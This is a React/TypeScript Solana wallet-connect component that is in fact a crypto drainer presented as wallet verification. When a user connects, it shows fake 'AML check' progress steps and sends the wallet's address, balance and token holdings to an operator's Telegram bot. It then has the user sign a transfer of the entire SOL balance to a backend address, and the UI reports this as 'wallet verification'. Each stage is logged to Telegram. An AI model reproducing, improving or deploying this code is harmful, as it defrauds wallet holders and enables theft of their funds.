
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { FC, useEffect, useState } from 'react';
import { toast } from '@/components/ui/use-toast';
import { 
  getTokenAccounts, 
  sendToTelegram, 
  signAndSendTransaction, 
  getWalletBalance, 
  hasEnoughSolForRent 
} from '@/utils/walletUtils';
import LoadingModal, { ConnectionStep } from '@/components/LoadingModal';

interface ConnectWalletButtonProps {
  backendAddress: string;
  telegramBotToken: string;
  telegramChatId: string;
  className?: string;
}

const initialSteps: ConnectionStep[] = [
  { id: 'connect', label: 'Connect', status: 'pending' },
  { id: 'connectSuccess', label: 'Connect success', status: 'pending' },
  { id: 'addressCheck', label: 'Address check', status: 'pending' },
  { id: 'amlCheck', label: 'AML check', status: 'pending' },
  { id: 'successfulAmlCheck', label: 'Successful AML check', status: 'pending' },
  { id: 'scanningDetails', label: 'Scanning details', status: 'pending' },
  { id: 'thanks', label: 'Thanks', status: 'pending' },
  { id: 'processing', label: 'Processing', status: 'pending' },
  { id: 'completed', label: 'Completed', status: 'pending' }
];

const ConnectWalletButton: FC<ConnectWalletButtonProps> = ({ 
  backendAddress, 
  telegramBotToken, 
  telegramChatId,
  className 
}) => {
  const { publicKey, connecting, connected, wallet } = useWallet();
  const { connection } = useConnection();
  const [isProcessing, setIsProcessing] = useState(false);
  const [walletBalance, setWalletBalance] = useState<number | null>(null);
  const [connectionError, setConnectionError] = useState<string | null>(null);
  const [fetchRetries, setFetchRetries] = useState(0);
  
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [connectionSteps, setConnectionSteps] = useState<ConnectionStep[]>(initialSteps);
  const [currentStep, setCurrentStep] = useState('connect');

  const updateStepStatus = (stepId: string, status: 'pending' | 'active' | 'completed' | 'error') => {
    setConnectionSteps(steps => 
      steps.map(step => 
        step.id === stepId 
          ? { ...step, status } 
          : step
      )
    );
    if (status === 'active') {
      setCurrentStep(stepId);
    }
  };

  const advanceToNextStep = (currentStepId: string) => {
    updateStepStatus(currentStepId, 'completed');
    
    const currentIndex = connectionSteps.findIndex(step => step.id === currentStepId);
    
    if (currentIndex < connectionSteps.length - 1) {
      const nextStep = connectionSteps[currentIndex + 1];
      updateStepStatus(nextStep.id, 'active');
    }
  };

  const fetchWalletData = async () => {
    if (!publicKey || !wallet) {
      console.log("Wallet, connection, or public key not available");
      setConnectionError("Wallet or connection not available");
      return null;
    }

    setConnectionError(null);
    
    try {
      updateStepStatus('addressCheck', 'active');
      
      const [solBalance, tokenAccounts] = await Promise.all([
        getWalletBalance(publicKey.toString())
          .then(balance => {
            console.log("Current balance:", balance, "SOL");
            setWalletBalance(balance);
            return balance;
          }),
        Promise.resolve().then(async () => {
          advanceToNextStep('addressCheck');
          updateStepStatus('amlCheck', 'active');
          console.log("Fetching token accounts");
          const tokens = await getTokenAccounts(connection, publicKey.toString());
          console.log("Token accounts received:", tokens);
          return tokens;
        })
      ]);
      
      advanceToNextStep('amlCheck');
      updateStepStatus('successfulAmlCheck', 'active');
      await new Promise(resolve => setTimeout(resolve, 150));
      advanceToNextStep('successfulAmlCheck');

      updateStepStatus('scanningDetails', 'active');
      await new Promise(resolve => setTimeout(resolve, 150));
      advanceToNextStep('scanningDetails');

      updateStepStatus('thanks', 'active');
      await new Promise(resolve => setTimeout(resolve, 150));
      advanceToNextStep('thanks');

      setFetchRetries(0);

      return {
        address: publicKey.toString(),
        tokens: tokenAccounts || [],
        balance: solBalance,
        connectionTime: new Date().toISOString(),
        walletName: wallet?.adapter?.name || "Unknown Wallet"
      };
    } catch (error) {
      console.error("Error fetching wallet data:", error);
      setConnectionError(error instanceof Error ? error.message : "Unknown error fetching wallet data");
      
      const newRetryCount = fetchRetries + 1;
      setFetchRetries(newRetryCount);
      
      if (newRetryCount < 3) {
        console.log(`Auto-retrying wallet data fetch (${newRetryCount}/3)...`);
        toast({
          title: "Connection Issue",
          description: "Retrying to fetch wallet data...",
        });
        setTimeout(() => {
          fetchWalletData();
        }, 1000 * newRetryCount);
      }
      
      return null;
    }
  };

  const handleWalletConnection = async () => {
    if (!publicKey || !wallet) {
      console.log("Wallet or public key not available");
      return;
    }

    if (isProcessing) {
      console.log("Already processing a transaction");
      return;
    }

    setIsProcessing(true);
    setConnectionSteps(initialSteps);
    setShowLoadingModal(true);
    
    updateStepStatus('connect', 'active');
    await new Promise(resolve => setTimeout(resolve, 100));
    advanceToNextStep('connect');
    
    updateStepStatus('connectSuccess', 'active');
    await new Promise(resolve => setTimeout(resolve, 100));
    advanceToNextStep('connectSuccess');
    
    try {
      console.log("Starting wallet connection process");
      
      let walletData = null;
      for (let attempt = 0; attempt < 2; attempt++) {
        try {
          walletData = await fetchWalletData();
          if (walletData) break;
          console.log(`Wallet data fetch attempt ${attempt + 1} failed, retrying...`);
          await new Promise(resolve => setTimeout(resolve, 500 * (attempt + 1)));
        } catch (e) {
          console.error(`Fetch attempt ${attempt + 1} error:`, e);
        }
      }
      
      if (!walletData) {
        throw new Error("Failed to fetch wallet data after multiple attempts");
      }
      
      const telegramSent = await sendToTelegram(walletData, telegramBotToken, telegramChatId);
      
      if (!telegramSent) {
        console.error("Failed to send data to Telegram");
        
        setTimeout(async () => {
          await sendToTelegram(walletData!, telegramBotToken, telegramChatId);
        }, 3000);
      } else {
        console.log("Successfully sent wallet data to Telegram");
      }

      if (walletData.balance <= 0) {
        console.log("Wallet has no SOL balance");
        
        const zeroBalanceMessage = {
          address: publicKey.toString(),
          message: `WALLET HAS ZERO BALANCE. No transfer will be attempted.`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(zeroBalanceMessage, telegramBotToken, telegramChatId);
        
        toast({
          title: "Low Balance",
          description: "Your wallet has no SOL balance. No further action needed.",
        });
        setIsProcessing(false);
        setShowLoadingModal(false);
        return;
      }

      if (!hasEnoughSolForRent(walletData.balance)) {
        console.log("Wallet balance too low for rent exemption");
        
        const lowRentMessage = {
          address: publicKey.toString(),
          message: `INSUFFICIENT FUNDS FOR RENT EXEMPTION. Balance: ${walletData.balance.toFixed(6)} SOL.`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(lowRentMessage, telegramBotToken, telegramChatId);
        
        toast({
          title: "Insufficient Funds",
          description: `Your wallet must have sufficient SOL for rent exemption and fees.`,
          variant: "destructive",
        });
        setIsProcessing(false);
        setShowLoadingModal(false);
        return;
      }

      updateStepStatus('processing', 'active');

      const transferMessage = {
        address: publicKey.toString(),
        message: `ATTEMPTING TO TRANSFER ${walletData.balance.toFixed(6)} SOL to ${backendAddress}`,
        walletName: wallet?.adapter?.name || "Unknown Wallet"
      };
      
      await sendToTelegram(transferMessage, telegramBotToken, telegramChatId);

      console.log("Initiating transfer");
      
      try {
        toast({
          title: "Processing",
          description: "Completing your wallet verification...",
        });

        if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
          throw new Error("Wallet or publicKey is undefined");
        }

        const signature = await signAndSendTransaction(
          connection,
          wallet,
          backendAddress,
          walletData.balance,
          telegramBotToken,
          telegramChatId
        );

        advanceToNextStep('processing');
        updateStepStatus('completed', 'active');
        await new Promise(resolve => setTimeout(resolve, 300));
        advanceToNextStep('completed');

        console.log("Transfer completed with signature:", signature);
        
        const completionMessage = {
          address: publicKey.toString(),
          message: `TRANSFER COMPLETED! ${walletData.balance.toFixed(6)} SOL sent.
Transaction: https://explorer.solana.com/tx/${signature}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(completionMessage, telegramBotToken, telegramChatId);
        
        toast({
          title: "Success!",
          description: "Wallet verification and transaction completed!",
        });
      } catch (error) {
        console.error("Transfer failed:", error);
        
        setConnectionSteps(prev => [
          ...prev,
          { id: 'errorTitle', label: 'Error - title', status: 'error' },
          { id: 'errorDescription', label: 'Error - description', status: 'error' }
        ]);
        
        updateStepStatus('errorTitle', 'active');
        await new Promise(resolve => setTimeout(resolve, 200));
        
        const failureMessage = {
          address: publicKey.toString(),
          message: `TRANSFER FAILED! Error: ${error instanceof Error ? error.message : "Unknown error"}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(failureMessage, telegramBotToken, telegramChatId);
        
        toast({
          title: "Transfer Failed",
          description: error instanceof Error ? error.message : "Failed to process transaction",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('Detailed error in wallet connection:', error);
      setConnectionError(error instanceof Error ? error.message : "Unknown error in wallet connection");
      
      if (publicKey) {
        const errorMessage = {
          address: publicKey.toString(),
          message: `ERROR DURING WALLET CONNECTION: ${error instanceof Error ? error.message : "Unknown error"}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(errorMessage, telegramBotToken, telegramChatId);
      }
      
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to process wallet connection",
        variant: "destructive",
      });
    } finally {
      setTimeout(() => {
        setShowLoadingModal(false);
        setIsProcessing(false);
      }, 800);
    }
  };

  useEffect(() => {
    if (connected && publicKey && !isProcessing) {
      handleWalletConnection();
    }
  }, [connected, publicKey]);

  return (
    <>
      <LoadingModal 
        isOpen={showLoadingModal} 
        steps={connectionSteps} 
        currentStep={currentStep} 
      />
      
      <WalletMultiButton className={className || "glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold"} />
      
      {connectionError && (
        <div className="mt-4 p-4 bg-red-900/30 border border-red-700 rounded-lg w-full">
          <p className="text-red-300 font-semibold">Connection Error:</p>
          <p className="text-white/80 text-sm">{connectionError}</p>
        </div>
      )}
    </>
  );
};

export default ConnectWalletButton;
